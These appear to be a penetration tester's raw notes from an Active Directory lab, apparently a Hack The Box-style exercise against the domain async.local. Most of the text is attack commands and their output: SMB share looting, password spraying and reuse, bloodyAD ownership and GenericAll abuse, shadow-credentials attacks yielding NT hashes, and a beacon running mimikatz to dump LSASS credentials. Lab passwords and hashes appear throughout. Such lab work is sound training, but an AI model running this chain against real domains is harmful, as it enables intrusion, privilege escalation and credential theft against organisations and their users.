

```r
[Apr 15, 2025 - 16:38:24 (+03)] exegol-htb /workspace  smbclientng -d "FS.async.local" -u "anonymous" -p "" --host "10.5.10.16" -T 10
               _          _ _            _
 ___ _ __ ___ | |__   ___| (_) ___ _ __ | |_      _ __   __ _
/ __| '_ ` _ \| '_ \ / __| | |/ _ \ '_ \| __|____| '_ \ / _` |
\__ \ | | | | | |_) | (__| | |  __/ | | | ||_____| | | | (_| |
|___/_| |_| |_|_.__/ \___|_|_|\___|_| |_|\__|    |_| |_|\__, |
    by @podalirius_                             v2.1.8  |___/

  | Provide a password for 'FS.async.local\anonymous':
[+] Successfully authenticated to '10.5.10.16' as 'FS.async.local\anonymous'!
share■[\\10.5.10.16\]> shares
┏━━━━━━━━━━━━━┳━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
┃ Share       ┃ Visibility ┃ Type              ┃ Description                                           ┃
┡━━━━━━━━━━━━━╇━━━━━━━━━━━━╇━━━━━━━━━━━━━━━━━━━╇━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┩
│ ADMIN$      │ Hidden     │ DISKTREE, SPECIAL │ Remote Admin                                          │
│ C$          │ Hidden     │ DISKTREE, SPECIAL │ Default share                                         │
│ developers  │ Visible    │ DISKTREE          │ Private share for Async Developers                    │
│ IPC$        │ Hidden     │ IPC, SPECIAL      │ Remote IPC                                            │
│ public_docs │ Visible    │ DISKTREE          │ Public share for auditors, contractors and employees. │
│ svc_home$   │ Hidden     │ DISKTREE          │ Common share for service accounts.                    │
└─────────────┴────────────┴───────────────────┴───────────────────────────────────────────────────────┘
```



```python
■[\\10.5.10.16\public_docs\]> cat migration.txt
A note from IT,

As part of our infrastructure expansion and security improvements, we are beginning the migration of users from the legacy system to the new system. This process will take some time, and we appreciate your patience as we work through it.

We will be migrating users in batches, and you will receive an email when your account has been migrated.

There should be no disruption to your service after migration, other than your username being suffixed with ".FROM.LG" for the time being. Please note that this is a temporary measure, and we will be removing the ".FROM.LG" suffix in the future.
```


```r
[Apr 15, 2025 - 16:44:48 (+03)] exegol-htb /workspace  cat team_contact_list.txt
Attached in `team_contact_list.csv` are the details for the lead members of each department, please reach out to them for any queries or concerns.#   
```



```python
SMB         10.5.10.2       445    DC               [+] Dumping password info for domain: async
SMB         10.5.10.2       445    DC               Minimum password length: None
SMB         10.5.10.2       445    DC               Password history length: None
SMB         10.5.10.2       445    DC               Maximum password age: 41 days 23 hours 53 minutes
SMB         10.5.10.2       445    DC
SMB         10.5.10.2       445    DC               Password Complexity Flags: 000000
SMB         10.5.10.2       445    DC                   Domain Refuse Password Change: 0
SMB         10.5.10.2       445    DC                   Domain Password Store Cleartext: 0
SMB         10.5.10.2       445    DC                   Domain Password Lockout Admins: 0
SMB         10.5.10.2       445    DC                   Domain Password No Clear Change: 0
SMB         10.5.10.2       445    DC                   Domain Password No Anon Change: 0
SMB         10.5.10.2       445    DC                   Domain Password Complex: 0
SMB         10.5.10.2       445    DC
SMB         10.5.10.2       445    DC               Minimum password age: None
SMB         10.5.10.2       445    DC               Reset Account Lockout Counter: 30 minutes
SMB         10.5.10.2       445    DC               Locked Account Duration: 30 minutes
SMB         10.5.10.2       445    DC               Account Lockout Threshold: None
SMB         10.5.10.2       445    DC               Forced Log off Time: Not Set
```




`james:november11`
`svc_web:webmaster`



```python
[Apr 15, 2025 - 21:20:39 (+03)] exegol-htb /workspace  nxc smb computers.txt -u 'svc_web' -p 'webmaster' -k --shares
SMB         10.5.10.2       445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:async.local) (signing:True) (SMBv1:False)
SMB         10.5.10.173     445    DEV              [*] Windows 11 Build 22621 x64 (name:DEV) (domain:async.local) (signing:False) (SMBv1:False)
SMB         10.5.10.16      445    FS               [*] Windows Server 2022 Build 20348 x64 (name:FS) (domain:async.local) (signing:False) (SMBv1:False)
SMB         10.5.10.2       445    DC               [+] async.local\svc_web:webmaster
SMB         10.5.10.173     445    DEV              [+] async.local\svc_web:webmaster
SMB         10.5.10.16      445    FS               [+] async.local\svc_web:webmaster
SMB         10.5.10.173     445    DEV              [*] Enumerated shares
SMB         10.5.10.173     445    DEV              Share           Permissions     Remark
SMB         10.5.10.173     445    DEV              -----           -----------     ------
SMB         10.5.10.173     445    DEV              ADMIN$                          Remote Admin
SMB         10.5.10.173     445    DEV              C$                              Default share
SMB         10.5.10.173     445    DEV              IPC$            READ            Remote IPC
SMB         10.5.10.2       445    DC               [*] Enumerated shares
SMB         10.5.10.2       445    DC               Share           Permissions     Remark
SMB         10.5.10.2       445    DC               -----           -----------     ------
SMB         10.5.10.2       445    DC               ADMIN$                          Remote Admin
SMB         10.5.10.2       445    DC               C$                              Default share
SMB         10.5.10.2       445    DC               IPC$            READ            Remote IPC
SMB         10.5.10.2       445    DC               NETLOGON        READ            Logon server share
SMB         10.5.10.2       445    DC               SYSVOL          READ            Logon server share
SMB         10.5.10.16      445    FS               [*] Enumerated shares
SMB         10.5.10.16      445    FS               Share           Permissions     Remark
SMB         10.5.10.16      445    FS               -----           -----------     ------
SMB         10.5.10.16      445    FS               ADMIN$                          Remote Admin
SMB         10.5.10.16      445    FS               C$                              Default share
SMB         10.5.10.16      445    FS               developers      READ            Private share for Async Developers
SMB         10.5.10.16      445    FS               IPC$            READ            Remote IPC
SMB         10.5.10.16      445    FS               public_docs     READ            Public share for auditors, contractors and employees.
SMB         10.5.10.16      445    FS               svc_home$       READ,WRITE      Common share for service accounts.
```




```python
[Apr 15, 2025 - 21:30:27 (+03)] exegol-htb /workspace # nxc smb 10.5.10.16 -u 'svc_web' -p 'webmaster' -k --share 'svc_home$' --get-file 'svc_web/web.config' web.config
SMB         10.5.10.16      445    FS               [*] Windows Server 2022 Build 20348 x64 (name:FS) (domain:async.local) (signing:False) (SMBv1:False)
SMB         10.5.10.16      445    FS               [+] async.local\svc_web:webmaster
SMB         10.5.10.16      445    FS               [*] Copying "svc_web/web.config" to "web.config"
SMB         10.5.10.16      445    FS               [+] File "svc_web/web.config" was downloaded to "web.config"
[Apr 15, 2025 - 21:30:40 (+03)] exegol-htb /workspace # cat web.config
<?xml version="1.0" encoding="utf-8"?>
<configuration>
  <connectionStrings>
    <add name="DefaultConnection"
         connectionString="Server=db.async.local;Database=InternalApp;User ID=Tyler_ROSE;Password=OyShGdq86AIG8RzdaAS5L;"
         providerName="System.Data.SqlClient" />
  </connectionStrings>

  <appSettings>
    <add key="AppMode" value="Production" />
    <add key="ApiKey" value="tyler-secret-api-key-42f7a" />
  </appSettings>

  <system.web>
    <compilation debug="false" targetFramework="4.8" />
    <authentication mode="Forms">
      <forms loginUrl="~/Account/Login" timeout="30" />
    </authentication>
    <authorization>
      <allow users="Tyler_ROSE" />
      <deny users="*" />
    </authorization>
  </system.web>
</configuration>
```



```
drw-rw-rw-          0  Tue Apr 15 21:21:48 2025 .
drw-rw-rw-          0  Tue Apr 15 15:48:04 2025 ..
drw-rw-rw-          0  Tue Apr 15 15:47:22 2025 svc_sql
drw-rw-rw-          0  Tue Apr 15 15:47:22 2025 svc_vdi
drw-rw-rw-          0  Tue Apr 15 15:47:22 2025 svc_web
# cd svc_sqcl
[-] SMB SessionError: code: 0xc0000034 - STATUS_OBJECT_NAME_NOT_FOUND - The object name is not found.
# cd svc_sql
# ls
drw-rw-rw-          0  Tue Apr 15 15:47:22 2025 .
drw-rw-rw-          0  Tue Apr 15 21:21:48 2025 ..
-rw-rw-rw-        108  Tue Apr 15 15:47:22 2025 config.xml
-rw-rw-rw-         76  Tue Apr 15 15:47:22 2025 sqlcmd_output.log
# get config.xml
# get sqlcmd_output.log
# ls
drw-rw-rw-          0  Tue Apr 15 15:47:22 2025 .
drw-rw-rw-          0  Tue Apr 15 21:21:48 2025 ..
-rw-rw-rw-        108  Tue Apr 15 15:47:22 2025 config.xml
-rw-rw-rw-         76  Tue Apr 15 15:47:22 2025 sqlcmd_output.log
```


```
[Apr 15, 2025 - 22:15:13 (+03)] exegol-htb /workspace # cat hd.key
-----BEGIN VDI IMPERSONATION TOKEN-----
vdi-helpdesk@ASYNC.LOCAL
Issued: 2025-04-13T14:45:27Z
Expires: 2025-04-13T20:45:27Z
Scope: logon,user-profile,registry-access
SID: S-1-5-21-3662472359-1778509077-1936428934-1934
TokenID: 5f3c2d80-a9f2-4b41-bcf5-87ddc3d2f738
MAC: c4c8c88f5bc3e7b0d492d6ee7768a7fe6c249db2

Payload:
eyJ1c2VyIjogImhlbHBkZXNrIiwgImFjdGlvbnMiOiBbImltcGVyc29uYXRlIiwgInVzZXItcHJvZmlsZSIsICJyZWdpc3RyeS1hY2Nlc3MiXSwgImV4cCI6ICIyMDI1LTEyLTMxVDAwOjAwOjAwWiJ9

-----END VDI IMPERSONATION TOKEN-----
```


```python
{
  "user": "helpdesk",
  "actions": [
    "impersonate",
    "user-profile",
    "registry-access"
  ],
  "exp": "2025-12-31T00:00:00Z"
}
```



- force some domain groups to egress to teamserver.
- SYSTEM doesnt work because in that security context its not allowed to egress or hit anything really



```python
[Apr 15, 2025 - 23:28:45 (+03)] exegol-htb adidnsdump / bloodyAD --host "10.5.10.2" -d async.local -u tyler_rose -p 'OyShGdq86AIG8RzdaAS5L' get writable

distinguishedName: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=async,DC=local
permission: WRITE

distinguishedName: CN=Tyler_ROSE,CN=Users,DC=async,DC=local
permission: WRITE

distinguishedName: CN=Service Accounts,CN=Users,DC=async,DC=local
permission: CREATE_CHILD; WRITE
OWNER: WRITE
DACL: WRITE
```



we find these shares 


```
[Apr 15, 2025 - 23:35:37 (+03)] exegol-htb /workspace # smbclient.py "async.local"/"tyler_rose":"OyShGdq86AIG8RzdaAS5L"@"FS.async.local"                                                                         Impacket v0.13.0.dev0+20250107.155526.3d734075 - Copyright Fortra, LLC and its affiliated companies

Type help for list of commands
# use developers
ls
# ls
drw-rw-rw-          0  Tue Apr 15 23:35:06 2025 .
drw-rw-rw-          0  Tue Apr 15 15:48:04 2025 ..
drw-rw-rw-          0  Tue Apr 15 15:48:04 2025 David_CHUA
drw-rw-rw-          0  Tue Apr 15 15:48:04 2025 Donald_TAN
drw-rw-rw-          0  Tue Apr 15 15:48:04 2025 John_LEE
drw-rw-rw-          0  Tue Apr 15 15:48:04 2025 Michael_LEE
drw-rw-rw-          0  Tue Apr 15 15:48:04 2025 Ronald_CHUA
drw-rw-rw-          0  Tue Apr 15 15:48:04 2025 Taylor_PARRY
```



```python
tree
/David_CHUA/.gitkeep
/David_CHUA/mem
/Donald_TAN/.gitkeep
/John_LEE/.gitkeep
/John_LEE/main.ipynb
/John_LEE/svc_usage.json
/Michael_LEE/.gitkeep
/Ronald_CHUA/.gitkeep
/Ronald_CHUA/azure
/Taylor_PARRY/.gitkeep
/David_CHUA/mem/cpu_usage.c
/David_CHUA/mem/makefile
/Ronald_CHUA/azure/deploy_vm.py
/Ronald_CHUA/azure/requirements.txt
```



```
[Apr 15, 2025 - 23:42:18 (+03)] exegol-htb /workspace # cat makefile
USER=David_CHUA
PASS=&Q0N@qMJzZjM
HOST=CLIENT01.async.local
TARGET=cpu.exe
REMOTE_PATH='C:\\tools\\cpu.exe'

all: build upload run

build:
        gcc cpu_usage.c -o $(TARGET)

upload:
        pwsh -Command "Invoke-Command -ComputerName $(HOST) -Credential (New-Object System.Management.Automation.PSCredential('$(USER)', (ConvertTo-SecureString $(PASS) -AsPlainText -Force))) -ScriptBlock { New-Item -Path 'C:\\tools' -ItemType Directory -Force }"
        pwsh -Command "Copy-Item -Path .\\$(TARGET) -Destination \\\\$(HOST)\\C$$\\tools\\$(TARGET) -Force"

run:
        pwsh -Command "Invoke-Command -ComputerName $(HOST) -Credential (New-Object System.Management.Automation.PSCredential('$(USER)', (ConvertTo-SecureString $(PASS) -AsPlainText -Force))) -ScriptBlock { Start-Process '$(REMOTE_PATH)' -Wait }"

clean:
        rm -f $(TARGET)
```




```
[Apr 15, 2025 - 23:56:02 (+03)] exegol-htb /workspace # bloodyAD --host "10.5.10.2" -d async.local -u David_CHUA -p '&Q0N@qMJzZjM' set owner JOSEPH_LIEW DAVID_CHUA
[+] Old owner S-1-5-21-4101459401-1929609979-3036583182-512 is now replaced by DAVID_CHUA on JOSEPH_LIEW
```


```
[Apr 16, 2025 - 00:00:30 (+03)] exegol-htb /workspace # bloodyAD --host "10.5.10.2" -d async.local -u David_CHUA -p '&Q0N@qMJzZjM' add genericAll joseph_liew david_chua
[+] david_chua has now GenericAll on joseph_liew
```



```
[Apr 16, 2025 - 00:00:47 (+03)] exegol-htb /workspace # bloodyAD --host "10.5.10.2" -d async.local -u David_CHUA -p '&Q0N@qMJzZjM' add shadowCredentials joseph_liew
[+] KeyCredential generated with following sha256 of RSA key: b298e5325226964615f6ae7f71bdcf7f5237b477a0defc29c7e91e4024b65581
No outfile path was provided. The certificate(s) will be stored with the filename: 5jO2eyyS
[+] Saved PEM certificate at path: 5jO2eyyS_cert.pem
[+] Saved PEM private key at path: 5jO2eyyS_priv.pem
A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools
Run the following command to obtain a TGT:
python3 PKINITtools/gettgtpkinit.py -cert-pem 5jO2eyyS_cert.pem -key-pem 5jO2eyyS_priv.pem async.local/joseph_liew 5jO2eyyS.ccache
```



```
[Apr 16, 2025 - 00:05:39 (+03)] exegol-htb /workspace # certipy shadow auto -u david_chua@async.local -p '' -account joseph_liew
Certipy v4.8.2 - by Oliver Lyak (ly4k)

Password:
[*] Targeting user 'Joseph_LIEW'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID 'f3c260c4-70a6-c29d-2ab4-10a9d139baa5'
[*] Adding Key Credential with device ID 'f3c260c4-70a6-c29d-2ab4-10a9d139baa5' to the Key Credentials for 'Joseph_LIEW'
[*] Successfully added Key Credential with device ID 'f3c260c4-70a6-c29d-2ab4-10a9d139baa5' to the Key Credentials for 'Joseph_LIEW'
[*] Authenticating as 'Joseph_LIEW' with the certificate
[*] Using principal: joseph_liew@async.local
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'joseph_liew.ccache'
[*] Trying to retrieve NT hash for 'joseph_liew'
[*] Restoring the old Key Credentials for 'Joseph_LIEW'
[*] Successfully restored the old Key Credentials for 'Joseph_LIEW'
[*] NT hash for 'Joseph_LIEW': 57c841a4a5145fc69814572e0d5be285
```


```
[Apr 16, 2025 - 00:13:01 (+03)] exegol-htb /workspace # nxc smb computers.txt -u 'Joseph_LIEW' -H '57c841a4a5145fc69814572e0d5be285' -k --shares --smb-timeout 15 -M spider_plus
```

```

```





### Dumping File Share


```python
[04/16 14:50:21] beacon> mimikatz token::elevate; sekurlsa::logonpasswords
[04/16 14:50:21] [*] Tasked beacon to run mimikatz's token::elevate; sekurlsa::logonpasswords command
[04/16 14:50:22] [+] host called home, sent: 814350 bytes
[04/16 14:50:26] [+] received output:
Token Id  : 0
User name : 
SID name  : NT AUTHORITY\SYSTEM

664	{0;000003e7} 1 D 32904     	NT AUTHORITY\SYSTEM	S-1-5-18	(04g,21p)	Primary
 -> Impersonated !
 * Process Token : {0;00d29182} 0 D 45103926  	async\Tyler_ROSE	S-1-5-21-4101459401-1929609979-3036583182-1372	(12g,24p)	Primary
 * Thread Token  : {0;000003e7} 1 D 45171858  	NT AUTHORITY\SYSTEM	S-1-5-18	(04g,21p)	Impersonation (Delegation)

Authentication Id : 0 ; 8530315 (00000000:0082298b)
Session           : Interactive from 2
User Name         : UMFD-2
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 4/16/2025 1:43:06 AM
SID               : S-1-5-96-0-2
	msv :	
	 [00000003] Primary
	 * Username : FS$
	 * Domain   : async
	 * NTLM     : 432ee5cc1a1a1f7689445e8da9abf073
	 * SHA1     : 29afd408ddac5d1b1dee1d0f2f482413b8b4abf3
	tspkg :	
	wdigest :	
	 * Username : FS$
	 * Domain   : async
	 * Password : (null)
	kerberos :	
	 * Username : FS$
	 * Domain   : async.local
	 * Password : s0sU.O2[nRim-RcS`,PzvwYky.NIpIU]8B6is\v?2kiA=-xF!O;B1G&KGAeFKs5"dX8-e;Bo)dLpRr#Of%R,20?$#ZvRaL?<.8Ma%/i6;70)f-jZk=A][KJt
	ssp :	
	credman :	
	cloudap :	

Authentication Id : 0 ; 1464145 (00000000:00165751)
Session           : Batch from 0
User Name         : Austin_BROOKS
Domain            : async
Logon Server      : DC
Logon Time        : 4/15/2025 8:48:33 PM
SID               : S-1-5-21-4101459401-1929609979-3036583182-1373
	msv :	
	 [00000003] Primary
	 * Username : Austin_BROOKS <---------------------------------------------
	 * Domain   : async
	 * NTLM     : 3a7b6510f7ba73bf0171dd258a01234d
	 * SHA1     : d2ea56547dde760d818f242f9558350c3fda8cfd
	 * DPAPI    : 82f6866480514c4e10e557efcb701c51
	tspkg :	
	wdigest :	
	 * Username : Austin_BROOKS
	 * Domain   : async
	 * Password : (null)
	kerberos :	
	 * Username : Austin_BROOKS
	 * Domain   : ASYNC.LOCAL
	 * Password : (null)
	ssp :	
	credman :	
	cloudap :	

Authentication Id : 0 ; 999 (00000000:000003e7)
Session           : UndefinedLogonType from 0
User Name         : FS$
Domain            : async
Logon Server      : (null)
Logon Time        : 4/15/2025 8:42:02 PM
SID               : S-1-5-18
	msv :	
	tspkg :	
	wdigest :	
	 * Username : FS$
	 * Domain   : async
	 * Password : (null)
	kerberos :	
	 * Username : fs$
	 * Domain   : ASYNC.LOCAL
	 * Password : (null)
	ssp :	
	credman :	
	cloudap :	

Authentication Id : 0 ; 8580604 (00000000:0082edfc)
Session           : RemoteInteractive from 2
User Name         : James_PARKER.FROM.LG 
Domain            : async
Logon Server      : DC
Logon Time        : 4/16/2025 1:43:09 AM
SID               : S-1-5-21-4101459401-1929609979-3036583182-1375
	msv :	
	 [00000003] Primary
	 * Username : James_PARKER.FROM.LG
	 * Domain   : async
	 * NTLM     : cf33821428fe79ad4556b5de9d28713c
	 * SHA1     : ab2b781ce075ef230cdba54dabb35060cdd786ba
	 * DPAPI    : 749c3ebab0c650de5be55d6a7edf43ba
	tspkg :	
	wdigest :	
	 * Username : James_PARKER.FROM.LG
	 * Domain   : async
	 * Password : (null)
	kerberos :	
	 * Username : James_PARKER.FROM.LG
	 * Domain   : ASYNC.LOCAL
	 * Password : (null)
	ssp :	
	credman :	
	cloudap :	

Authentication Id : 0 ; 996 (00000000:000003e4)
Session           : Service from 0
User Name         : FS$
Domain            : async
Logon Server      : (null)
Logon Time        : 4/15/2025 8:42:02 PM
SID               : S-1-5-20
	msv :	
	 [00000003] Primary
	 * Username : FS$
	 * Domain   : async
	 * NTLM     : 432ee5cc1a1a1f7689445e8da9abf073
	 * SHA1     : 29afd408ddac5d1b1dee1d0f2f482413b8b4abf3
	tspkg :	
	wdigest :	
	 * Username : FS$
	 * Domain   : async
	 * Password : (null)
	kerberos :	
	 * Username : fs$
	 * Domain   : ASYNC.LOCAL
	 * Password : (null)
	ssp :	
	credman :	
	cloudap :	

Authentication Id : 0 ; 38266 (00000000:0000957a)
Session           : Interactive from 1
User Name         : UMFD-1
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 4/15/2025 8:42:02 PM
SID               : S-1-5-96-0-1
	msv :	
	 [00000003] Primary
	 * Username : FS$
	 * Domain   : async
	 * NTLM     : 432ee5cc1a1a1f7689445e8da9abf073
	 * SHA1     : 29afd408ddac5d1b1dee1d0f2f482413b8b4abf3
	tspkg :	
	wdigest :	
	 * Username : FS$
	 * Domain   : async
	 * Password : (null)
	kerberos :	
	 * Username : FS$
	 * Domain   : async.local
	 * Password : s0sU.O2[nRim-RcS`,PzvwYky.NIpIU]8B6is\v?2kiA=-xF!O;B1G&KGAeFKs5"dX8-e;Bo)dLpRr#Of%R,20?$#ZvRaL?<.8Ma%/i6;70)f-jZk=A][KJt
	ssp :	
	credman :	
	cloudap :	

Authentication Id : 0 ; 8532508 (00000000:0082321c)
Session           : Interactive from 2
User Name         : DWM-2
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 4/16/2025 1:43:06 AM
SID               : S-1-5-90-0-2
	msv :	
	 [00000003] Primary
	 * Username : FS$
	 * Domain   : async
	 * NTLM     : 432ee5cc1a1a1f7689445e8da9abf073
	 * SHA1     : 29afd408ddac5d1b1dee1d0f2f482413b8b4abf3
	tspkg :	
	wdigest :	
	 * Username : FS$
	 * Domain   : async
	 * Password : (null)
	kerberos :	
	 * Username : FS$
	 * Domain   : async.local
	 * Password : s0sU.O2[nRim-RcS`,PzvwYky.NIpIU]8B6is\v?2kiA=-xF!O;B1G&KGAeFKs5"dX8-e;Bo)dLpRr#Of%R,20?$#ZvRaL?<.8Ma%/i6;70)f-jZk=A][KJt
	ssp :	
	credman :	
	cloudap :	

Authentication Id : 0 ; 997 (00000000:000003e5)
Session           : Service from 0
User Name         : LOCAL SERVICE
Domain            : NT AUTHORITY
Logon Server      : (null)
Logon Time        : 4/15/2025 8:42:03 PM
SID               : S-1-5-19
	msv :	
	tspkg :	
	wdigest :	
	 * Username : (null)
	 * Domain   : (null)
	 * Password : (null)
	kerberos :	
	 * Username : (null)
	 * Domain   : (null)
	 * Password : (null)
	ssp :	
	credman :	
	cloudap :	

Authentication Id : 0 ; 57986 (00000000:0000e282)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 4/15/2025 8:42:03 PM
SID               : S-1-5-90-0-1
	msv :	
	 [00000003] Primary
	 * Username : FS$
	 * Domain   : async
	 * NTLM     : 432ee5cc1a1a1f7689445e8da9abf073
	 * SHA1     : 29afd408ddac5d1b1dee1d0f2f482413b8b4abf3
	tspkg :	
	wdigest :	
	 * Username : FS$
	 * Domain   : async
	 * Password : (null)
	kerberos :	
	 * Username : FS$
	 * Domain   : async.local
	 * Password : s0sU.O2[nRim-RcS`,PzvwYky.NIpIU]8B6is\v?2kiA=-xF!O;B1G&KGAeFKs5"dX8-e;Bo)dLpRr#Of%R,20?$#ZvRaL?<.8Ma%/i6;70)f-jZk=A][KJt
	ssp :	
	credman :	
	cloudap :	

Authentication Id : 0 ; 38275 (00000000:00009583)
Session           : Interactive from 0
User Name         : UMFD-0
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 4/15/2025 8:42:02 PM
SID               : S-1-5-96-0-0
	msv :	
	 [00000003] Primary
	 * Username : FS$
	 * Domain   : async
	 * NTLM     : 432ee5cc1a1a1f7689445e8da9abf073
	 * SHA1     : 29afd408ddac5d1b1dee1d0f2f482413b8b4abf3
	tspkg :	
	wdigest :	
	 * Username : FS$
	 * Domain   : async
	 * Password : (null)
	kerberos :	
	 * Username : FS$
	 * Domain   : async.local
	 * Password : s0sU.O2[nRim-RcS`,PzvwYky.NIpIU]8B6is\v?2kiA=-xF!O;B1G&KGAeFKs5"dX8-e;Bo)dLpRr#Of%R,20?$#ZvRaL?<.8Ma%/i6;70)f-jZk=A][KJt
	ssp :	
	credman :	
	cloudap :	

Authentication Id : 0 ; 37163 (00000000:0000912b)
Session           : UndefinedLogonType from 0
User Name         : (null)
Domain            : (null)
Logon Server      : (null)
Logon Time        : 4/15/2025 8:42:02 PM
SID               : 
	msv :	
	 [00000003] Primary
	 * Username : FS$
	 * Domain   : async
	 * NTLM     : 432ee5cc1a1a1f7689445e8da9abf073
	 * SHA1     : 29afd408ddac5d1b1dee1d0f2f482413b8b4abf3
	tspkg :	
	wdigest :	
	kerberos :	
	ssp :	
	credman :	
	cloudap :	

```



![[Notes one-20250416145223397.webp]]



```python
[Apr 16, 2025 - 15:46:29 (+03)] exegol-htb /workspace~ bloodyAD --host "10.5.10.2" -d async.local -u austin_brooks -p ':3a7b6510f7ba73bf0171dd258a01234d' get writable

distinguishedName: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=async,DC=local
permission: WRITE

distinguishedName: CN=Austin_BROOKS,CN=Users,DC=async,DC=local
permission: WRITE

distinguishedName: CN=svc_async-1,CN=Users,DC=async,DC=local
permission: CREATE_CHILD; WRITE
OWNER: WRITE
DACL: WRITE

distinguishedName: CN=svc_async-2,CN=Users,DC=async,DC=local
permission: CREATE_CHILD; WRITE
OWNER: WRITE
DACL: WRITE

distinguishedName: CN=svc_async-3,CN=Users,DC=async,DC=local
permission: CREATE_CHILD; WRITE
OWNER: WRITE
DACL: WRITE

distinguishedName: CN=svc_async-4,CN=Users,DC=async,DC=local
permission: CREATE_CHILD; WRITE
OWNER: WRITE
DACL: WRITE

distinguishedName: CN=svc_async-5,CN=Users,DC=async,DC=local
permission: CREATE_CHILD; WRITE
OWNER: WRITE
DACL: WRITE

distinguishedName: CN=svc_async-6,CN=Users,DC=async,DC=local
permission: CREATE_CHILD; WRITE
OWNER: WRITE
DACL: WRITE

distinguishedName: CN=svc_async-7,CN=Users,DC=async,DC=local
permission: CREATE_CHILD; WRITE
OWNER: WRITE
DACL: WRITE

distinguishedName: CN=svc_async-8,CN=Users,DC=async,DC=local
permission: CREATE_CHILD; WRITE
OWNER: WRITE
DACL: WRITE
```



```
[Apr 16, 2025 - 15:48:00 (+03)] exegol-htb /workspace # certipy shadow auto -u austin_brooks@async.local -hashes ':3a7b6510f7ba73bf0171dd258a01234d' -account svc_test-57
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Targeting user 'svc_test-57'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID '792f9948-c030-a866-3bce-4a3dc7393355'
[*] Adding Key Credential with device ID '792f9948-c030-a866-3bce-4a3dc7393355' to the Key Credentials for 'svc_test-57'
[*] Successfully added Key Credential with device ID '792f9948-c030-a866-3bce-4a3dc7393355' to the Key Credentials for 'svc_test-57'
[*] Authenticating as 'svc_test-57' with the certificate
[*] Using principal: svc_test-57@async.local
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'svc_test-57.ccache'
[*] Trying to retrieve NT hash for 'svc_test-57'
[*] Restoring the old Key Credentials for 'svc_test-57'
[*] Successfully restored the old Key Credentials for 'svc_test-57'
[*] NT hash for 'svc_test-57': 066e856d94717943f07e887852dbd312
```


```

```


----


- what I have tried
	- jospeh liew
		- no outbound permissions
		- no 
	- svc_sql
		- sqladmin rights on SQL02
	- kerberoasting
		- got user
	- asreproasting
		- got user
	- shares
		- svc_home
			- VDI
			- sql config
				- got SQL_SVC user
	- dumped 
		- dumped FS
		- 
- What I have not tried
	- adidnsdump didnt do


- methodology
	- user enumeration to see if they exist
	- creating user lists
	- looting shares
	- password re-use
	- looting LSASS